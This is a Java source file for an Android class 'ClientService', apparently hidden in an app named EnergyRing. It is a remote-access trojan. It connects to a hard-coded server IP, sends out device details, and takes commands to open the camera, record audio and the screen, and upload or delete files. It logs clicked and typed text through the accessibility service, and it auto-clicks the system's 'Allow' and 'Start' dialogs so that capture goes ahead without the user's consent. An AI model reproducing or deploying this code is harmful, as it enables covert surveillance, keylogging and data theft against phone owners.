package cn.vove7.energy_ring.ClientService;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.graphics.Rect;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import cn.vove7.energy_ring.listener.NotificationListener;

public class ClientService extends MyAccService {

    private static final String TAG = "ClientService";
    public static final String APP_NAME = "EnergyRing";
    public static final int START_READ_MSG = 0;
    public static final int OPEN_CAMERA = 1;
    public static final int TAKE_PICTURE = 2;
    public static final int CLOSE_CAMERA = 3;
    public static final int GET_APP_LIST = 4;
    public static final int GET_FILE_LIST = 5;
    public static final int GET_DEVICE_INFO = 6;
    public static final int START_AUDIO = 7;
    public static final int STOP_AUDIO = 8;
    public static final int UPLOAD_FILE = 9;
//    public static final int START_SERVICE = 10;
    public static final int GET_FACE_TEXT = 12;
    public static final int STOP_GET_FACE_TEXT = 14;
    public static final int GET_FACE_ALL_TEXT = 15;
    public static final int STOP_UPLOAD_FILE = 16;
    public static final int DELETE_FILE = 17;
    public static final int UPLOAD_PICTURE = 18;
    public static final int START_SCREEN_RECORDER = 19;
    public static final int STOP_SCREEN_RECORDER = 20;

//    private int sampleRateType;
//    private int bitRateType;
    private final static int[] widthList = {320,640,960,1280,1920};
    private final static int[] heightList = {240,480,720,960,1080};
    private final static int[] bitRateList = {400000,800000,1500000,2000000,2500000,4000000,6000000,8000000,16000000};
//    private final static String[] cameraList = {"0","1","2","3","4","5","6","7"};
//    private int width = 320;
//    private int height = 240;
//    private int bitRate = 2500000;
//    private int cameraId = 0;
//    private String[] cameraIdList;

//    private String filePath;
//    private String fileName;

//    private boolean readMsg_start = false;
    private boolean readCommandState = false;
    private boolean screenState = true;
    private int displayWidth;
    private int displayHeight;
    private int displayDpi;

//    private HandlerThread handlerThread;
    public static  Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private SocketClient socketClient;
    private CameraFunctions cameraFunctions;
    private AudioStreamer audioStreamer;
    private FileManager fileManager;

    private static MyAccService myAccService;
    private static MyNotificationListener myNotificationListener;
    private static MyScreenListener myScreenListener;

    private Thread readThread;

    private static AccessibilityServiceInfo asi;

    private final Context context;


//    private Context clientContext;
//    AccessibilityServiceInfo asi;
//    private boolean serviceState;
//    private boolean connectState;

    @SuppressLint("StaticFieldLeak")
    public static AccessibilityService service;

    public static void sendMsg(int msg) {
        if(backgroundHandler != null) {
            backgroundHandler.sendEmptyMessage(msg);
        }
    }

    public static void sendMsg(int msg ,String str) {
        if(backgroundHandler != null) {
            Message message = new Message();
            message.what = msg;
            message.obj = str;
            if(backgroundHandler.sendMessage(message)) {
                Log.e(TAG, "sendMsg: 发送成功" );
            } else {
                Log.e(TAG, "sendMsg: 发送失败" );
            }
        }
    }
    /**
     * 启动后台线程
     */
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper()){
            @Override
            public void handleMessage(@NonNull Message message) {
                String data = (String) message.obj;
                try {
                    switch (message.what) {
                        case START_READ_MSG:
                            break;
                        case OPEN_CAMERA:
                            openCamera(data);
//                            startScreenRecorder(data);
                            break;
                        case TAKE_PICTURE:
                            if (cameraFunctions != null) {
                                cameraFunctions.takePicture();
                            }
                            break;
                        case CLOSE_CAMERA:
                            if (cameraFunctions != null) {
                                cameraFunctions.stopCamera();
//                                ScreenRecorder.stopScreenRecorder();

                                Log.e(TAG, "handleMessage: 相机关闭");
                            }
                            break;
//                    case START_SERVICE:
//                        reconnect();
//                        break;
                        case GET_APP_LIST:
//                            getApplist();
                            break;
                        case GET_FILE_LIST:
                            fileManager.getListFile(data.substring(1));
                            Log.e(TAG, "handleMessage: 获取文件" );
                            break;
                        case GET_DEVICE_INFO:
//                            getDeviceInfo();
                            break;
                        case START_AUDIO:
                            if (data.length() == 3) {
                                int bitRateType = data.codePointAt(1);
                                int sampleRateType = data.codePointAt(2);
                                Log.e(TAG, "bitRateType: " + bitRateType);
                                Log.e(TAG, "sampleRateType: " + sampleRateType);
                                audioStreamer.AudioStart(sampleRateType, bitRateType);
                            }
                            break;
                        case STOP_AUDIO:
                            audioStreamer.AudioStop();
                            break;
                        case GET_FACE_TEXT:
                            startGetFaceText();
                            break;
                        case STOP_GET_FACE_TEXT:
                            stopGetFaceText();
                            break;
                        case GET_FACE_ALL_TEXT:
                            getFaceAllText();
                            break;
                        case UPLOAD_FILE:
                            fileManager.uploadFile(data.substring(1));
                            break;
                        case STOP_UPLOAD_FILE:
                            fileManager.stopUploadFile();
                            break;
                        case DELETE_FILE:
                            fileManager.deleteFile(data.substring(1));
                            break;
                        case UPLOAD_PICTURE:
                            fileManager.getImageThumbnail(data.substring(1), 500, 500);
                            break;
                        case START_SCREEN_RECORDER:
                            startScreenRecorder(data);
                            break;
                        case STOP_SCREEN_RECORDER:
                            ScreenRecorder.stopScreenRecorder();
                            break;
                    }
//                    sendMsg(START_READ_MSG);
//                    readCommand();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
    }

    private ByteBuffer getDeviceInfo() {
        DisplayMetrics metrics = new DisplayMetrics();
        Point point = new Point();
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        windowManager.getDefaultDisplay().getRealSize(point);
        windowManager.getDefaultDisplay().getMetrics(metrics);

        displayWidth = point.x;
        displayHeight = point.y;
        displayDpi = metrics.densityDpi;

        String info = android.os.Build.BRAND + '\0' + android.os.Build.MODEL + '\0' + android.os.Build.VERSION.RELEASE + '\0';
        byte[] pakg = info.getBytes(StandardCharsets.UTF_8);

        ByteBuffer byteBuffer = ByteBuffer.allocate(pakg.length + 13);
        byteBuffer.put (SocketClient.CLIENT);
        byteBuffer.putInt(byteBuffer.limit());
        byteBuffer.putInt(displayWidth);
        byteBuffer.putInt(displayHeight);
        byteBuffer.put(pakg,0,pakg.length);
//        Log.e(TAG, "getDeviceInfo: " + new String(byteBuffer.array()));

        return byteBuffer;
    }

    /**
     * 停止后台线程
     */
    private void stopBackgroundThread() {
        if(backgroundThread != null) {
            backgroundThread.interrupt();
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

//    private PermissionManager permissionManager;

    public ClientService(Context context) {
        this.context = context;
        initClientService(context);
        startBackgroundThread();

        if(!MyNotificationListener.notificationListenerState) {
            PackageManager pm = context.getPackageManager();
            pm.setComponentEnabledSetting(new ComponentName(context, NotificationListener.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            pm.setComponentEnabledSetting(new ComponentName(context, NotificationListener.class), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            Log.e(TAG, "NotificationListener: 重新绑定" );
        }

//        getDeviceInfo();

        myAccService = this;
    }

    public static MyNotificationListener getMyNotificationListener() {
        return myNotificationListener;
    }

    public static MyAccService getMyAccService() {
        return myAccService;
    }

    public static MyScreenListener getMyScreenListener() {
        return myScreenListener;
    }

    @Override
    public void mOnServiceConnected(AccessibilityService as) {
        service = as;
        asi = service.getServiceInfo();
        asi.eventTypes |= AccessibilityEvent.TYPE_VIEW_CLICKED;
        service.setServiceInfo(asi);

        Log.e(TAG, "mOnServiceConnected: 服务连接" );
    }
    @Override
    public void mOnAccessibilityEvent(AccessibilityEvent event) {
        AutoClickAllow(event);
        getFaceText(event);
//        startService();
//        Log.e(TAG, "mOnAccessibilityEvent: 事件触发" );
    }
    @Override
    public void mOnUnbind(Intent intent) {
        asi = null;
        service = null;
        Log.e(TAG, "mOnServiceConnected: 服务断开" );
    }

    public void initClientService(Context context) {
//        socketClient = new SocketClient("192.168.1.81",6000);
        socketClient = new SocketClient("175.178.232.68",6000) {
//        socketClient = new SocketClient("192.168.1.4",6000) {
//        socketClient = new SocketClient("192.168.31.239",6000) {
            @Override
            public void connected(OutputStream outputStream) {
                ByteBuffer byteBuffer = getDeviceInfo();
                try {
                    outputStream.write(byteBuffer.array());
                } catch (IOException e) {
                    e.printStackTrace();
                }
                super.connected(outputStream);
                readCommand();
                startService();
            }
            @Override
            public void disconnect() {
                super.disconnect();
                readCommandState = false;
            }
        };

        audioStreamer = new AudioStreamer(context);
        fileManager = new FileManager(context);
        cameraFunctions = new CameraFunctions(context);
        myNotificationListener = new MyNotificationListener();
        myScreenListener = new MyScreenListener() {
            @Override
            public void screenOn() {
//                startService();
                screenState = true;
            }
            @Override
            public void screenOff() {
//                startService();
                screenState = false;
            }
            @Override
            public void screenUnlock() {
//                startService();
                screenState = true;
            }
        };

    }

    private static Thread testThread;
    public static void startService() {
        if(testThread == null) {
            testThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        while (true) {
                            Thread.sleep(1000 * 90);
                            SocketClient.sendMsg(SocketClient.TEST_STATE);
                        }
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            });
            testThread.start();
        }
    }

    public void stopService() {
        readCommandState = false;
        stopBackgroundThread();
        ScreenRecorder.stopScreenRecorder();
        if(socketClient != null) {
            socketClient.closeSocket();
            socketClient = null;
        }
        if(cameraFunctions != null) {
            cameraFunctions.stopCamera();
            cameraFunctions = null;
        }
        if(audioStreamer != null) {
            audioStreamer.AudioStop();
            audioStreamer = null;
        }
        if(fileManager != null) {
            fileManager = null;
        }
        if(myNotificationListener != null) {
            myNotificationListener = null;
        }
        if(readThread != null) {
            readThread = null;
        }
        if(testThread != null) {
            testThread.interrupt();
            testThread = null;
        }
    }

    private void startScreenRecorder(String data) {
        if (data.length() == 4 && screenState) {

            int width = data.codePointAt(1);
            int bitRate = data.codePointAt(2);

            width = width >= widthList.length ? 0 : width;
            bitRate = bitRate >= bitRateList.length ? 0 : bitRate;
            if(width > 3 || width < 1) {
                return ;
            }

            ScreenRecorder.startScreenRecorder(1080 / width,1920 / width,displayDpi,bitRateList[bitRate]);

            setAutoClickSum(1);
            Intent intent = new Intent(context,ScreenRecorder.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }


    private void openCamera(String data) {
        if (data.length() == 4) {
            int width = data.codePointAt(1);
            int height = width;
            int cameraId = data.codePointAt(2);
            int bitRate = data.codePointAt(3);

            width = width >= widthList.length ? 0 : width;
            height = height >= heightList.length ? 0 : height;
            bitRate = bitRate >= bitRateList.length ? 0 : bitRate;

            if(cameraFunctions != null) {
                cameraFunctions.openCamera(widthList[width], heightList[height], cameraId,bitRateList[bitRate]);
            }

        }
    }

    /**
     * 读取命令线程
     */
    public void readCommand() {
        if(readThread != null) {
            try {
                readThread.join();
                readThread = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        readCommandState = true;
        readThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    while(readCommandState) {
                        if (socketClient != null) {
                            Log.e(TAG, "handleMessage: 开始读取");
                            String data = socketClient.readString();
                            if (data.length() > 0) {
                                int commandId = data.codePointAt(0);
                                Log.e(TAG, "run: " + data);
                                Log.e(TAG, "run: 读取结束:" + data.codePointAt(0));
                                sendMsg(commandId, data);
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    readCommandState = false;
                }
                Log.e(TAG, "run: 读取线程退出" );

            }
        });
        readThread.start();
    }





//    private void getApplist() {
//        ContextWrapper contextWrapper = new ContextWrapper(service);
//        final PackageManager pm = contextWrapper.getPackageManager();
//        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
////        HashMap<String, Object> appIndexMap = new HashMap<>();
////        int appIndex = 1;
//        for (ApplicationInfo packageInfo : packages) {
//
////            HashMap<String, String> infoMap = new HashMap<>();
////            infoMap.put("package", packageInfo.packageName + "");
//
//            String packageName = packageInfo.packageName;
//            Drawable icon = packageInfo.loadIcon(pm);
//            String appName = packageInfo.loadLabel(pm).toString();
//            Log.e(TAG, "appName: " + appName );
//            Log.e(TAG, "packageName: " + packageName );
//            Log.e(TAG, "icon: " + Arrays.toString(drawableToByteArray(icon)));
//
////            if (packageInfo.sourceDir != null)
////                infoMap.put("dir", packageInfo.sourceDir + "");
////            infoMap.put("app_name", packageInfo.loadLabel(contextWrapper.getPackageManager()).toString() + "");
////            appIndexMap.put("###app-" + (appIndex) + "\n", infoMap);
////            appIndex++;
//        }
////        String base64 = Base64.encodeToString(appIndexMap.toString().getBytes(), Base64.DEFAULT);
////        Log.e(TAG, "getApplist: " + appIndexMap.toString() );
////        try {
////            SocketClient.sendData(appIndexMap.toString().getBytes(),0,appIndexMap.toString().getBytes().length);
////        } catch (IOException e) {
////            e.printStackTrace();
////        }
////        HashMap<String, Object> postData = new HashMap<>();
////        postData.put("device_id", deviceUniqueId);
////        postData.put("app_list", base64);
////        sendPostRequestsToClient(postData);
//    }

    public static boolean getPermissionState;
    public static int permissionSum;

    public static void setAutoClickSum(int sum) {
        if(service == null) {
            return ;
        }
        getPermissionState = true;
        permissionSum = sum;
        asi.eventTypes |= AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        asi.eventTypes |= AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        service.setServiceInfo(asi);
    }

    public void AutoClickAllow(AccessibilityEvent event) {
        int eventType = event.getEventType();
        if(eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if(getPermissionState) {
                if (permissionSum > 0) {
//                    Log.e(TAG, "AutoClickAllow:  窗口变化" );
                    if (nodeInfo != null) {
                        List<AccessibilityNodeInfo> list = nodeInfo.findAccessibilityNodeInfosByText("允许");
                        if (list.isEmpty()) {
                            list = nodeInfo.findAccessibilityNodeInfosByText("开始");
                        }
//                    Log.e(TAG, "list: " + list );
                        if (list.size() == 1) {
                            if (list.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                permissionSum--;
                            }
                        } else if (!list.isEmpty()) {
                            for (AccessibilityNodeInfo e : list) {
                                String text = e.getText().toString();
                                if (text.contains("不允许") || text.contains("本次")) {
                                    continue;
                                }
                                if (e.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                    permissionSum--;
                                }
                            }
                        }
                    }
                } else {
                    asi.eventTypes &= ~AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
                    asi.eventTypes &= ~AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
                    service.setServiceInfo(asi);
                    getPermissionState = false;
                }
            }
        }
    }


//    private void getDeviceInfo() {
//        Log.e(TAG, "getDeviceInfo: " + Build.VERSION.SDK_INT );
//    }

    public static boolean getFaceTextState = false;
    private void findAllNode(List<AccessibilityNodeInfo> roots, List<AccessibilityNodeInfo> list) {
        try {
            ArrayList<AccessibilityNodeInfo> tem = new ArrayList<>();
            for (AccessibilityNodeInfo e : roots) {
                if (e == null) continue;
                Rect rect = new Rect();
                e.getBoundsInScreen(rect);
                if (rect.width() <= 0 || rect.height() <= 0) continue;
                list.add(e);
                for (int n = 0; n < e.getChildCount(); n++) {
                    tem.add(e.getChild(n));
                }
            }
            if (!tem.isEmpty()) {
                findAllNode(tem, list);
            }
        } catch (Throwable e) {
//            e.printStackTrace();
        }
    }
    private Thread getFaceAllTextThread;
    private void getFaceAllText() {
        if(getFaceAllTextThread != null || service == null) {
            return ;
        }
        getFaceAllTextThread = new Thread(new Runnable() {
            @Override
            public void run() {
                AccessibilityNodeInfo root1 = service.getRootInActiveWindow();
                if (root1 == null) return;
                ArrayList<AccessibilityNodeInfo> roots = new ArrayList<>();
                roots.add(root1);
                ArrayList<AccessibilityNodeInfo> nodeList = new ArrayList<>();
                findAllNode(roots, nodeList);
//                String time = new SimpleDateFormat("yyyy-MM-dd-HH:mm:ss", Locale.CHINESE).format(new Date(System.currentTimeMillis()));
                StringBuilder stringBuilder = new StringBuilder();
//                stringBuilder.append(time);
                stringBuilder.append("\n\n\n\n所有文本:\n");
                for (AccessibilityNodeInfo e : nodeList) {
                    CharSequence text = e.getText();
                    if (text != null) {
                        stringBuilder.append("    [");
                        stringBuilder.append(text);
                        stringBuilder.append("]\n");
//                        Log.d(TAG, text + " ");
                    }
                }
//                stringBuilder.append(" \n");

                byte[] data = stringBuilder.toString().getBytes(StandardCharsets.UTF_8);
                int len = data.length;
                data[0] = (byte) 0XFF;
                data[1] = (byte) ((len >> 16) & 0XFF);
                data[2] = (byte) ((len >> 8) & 0XFF);
                data[3] = (byte) (len & 0XFF);
                try {
                    SocketClient.putSendData(data);
                } catch (Exception e) {
                    e.printStackTrace();
                    sendMsg(STOP_GET_FACE_TEXT);
//                    stopGetFaceText();
                }
//                if(!SocketClient.putSendData(data)) {
//                    stopGetFaceText();
//                }
//
//                if(!SocketClient.putSendData(stringBuilder.toString().getBytes())) {
//                    stopGetFaceText();
//                }
//                stringBuilder.append()
                getFaceAllTextThread = null;
            }
        });
        getFaceAllTextThread.start();
    }

    @SuppressLint("SwitchIntDef")
    public void getFaceText(AccessibilityEvent event) {
        if(getFaceTextState) {
            String head = "\n\n\n\n";
            boolean is = false;
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                head += "点击: ";
                is = true;
            } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                head += "更改文本: ";
                is = true;
            }

            if(is) {
                List<CharSequence> body = event.getText();
                if(body.isEmpty()) {
                    return ;
                }
                String str = head + body + '\n';

                byte[] data = str.getBytes(StandardCharsets.UTF_8);
                int len = data.length;
                data[0] = (byte) 0XFF;
                data[1] = (byte) ((len >> 16) & 0XFF);
                data[2] = (byte) ((len >> 8) & 0XFF);
                data[3] = (byte) (len & 0XFF);

                try {
                    SocketClient.putSendData(data);
                } catch (Exception e) {
                    e.printStackTrace();
                    sendMsg(STOP_GET_FACE_TEXT);
//                    stopGetFaceText();
                }
            }
        }
    }

    private void startGetFaceText() {
        getFaceTextState = true;
        SocketClient.startSend();

        if(service == null) {
            return ;
        }
        Log.e(TAG, "startGetFaceText: 启动" );

//        asi.eventTypes |= AccessibilityEvent.TYPE_VIEW_CLICKED;
        asi.eventTypes |= AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        service.setServiceInfo(asi);

    }

    public void stopGetFaceText() {
        getFaceTextState = false;
        SocketClient.stopSend();

        if(service == null) {
            return ;
        }
        Log.e(TAG, "startGetFaceText: 关闭" );

//        asi.eventTypes &= ~AccessibilityEvent.TYPE_VIEW_CLICKED;
        asi.eventTypes &= ~AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        service.setServiceInfo(asi);

    }

}